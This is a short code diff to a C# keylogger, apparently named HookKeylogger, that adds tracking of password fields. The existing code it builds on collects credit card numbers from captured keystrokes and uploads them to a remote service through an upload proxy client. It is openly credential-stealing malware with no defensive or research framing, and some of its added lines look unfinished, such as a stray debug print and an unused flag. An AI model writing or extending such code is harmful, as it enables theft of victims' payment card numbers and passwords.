@@ -26,6 +26,10 @@ namespace KeypressAggregator
             int creditCard = 0;
             String creditNum = "";
 
+            // Boolean for login-password credentials
+            bool passwordWindow;
+            String password = "";
+
             // Write the information to the stream, goes through each keypress
             StreamWriter o = new StreamWriter(newFile);
             HookKeylogger.UploadProxy.UploadProxyClient client = new HookKeylogger.UploadProxy.UploadProxyClient();
@@ -65,6 +69,11 @@ namespace KeypressAggregator
                     client.SendCi(ci);
 
                     creditNum = "";
+                }
+                Console.WriteLine("Hello");
+                if (ks.ActiveProgram)
+                {
+                    return buffer.ToString() + " PswdFld";
                 }
             }
             o.Close();
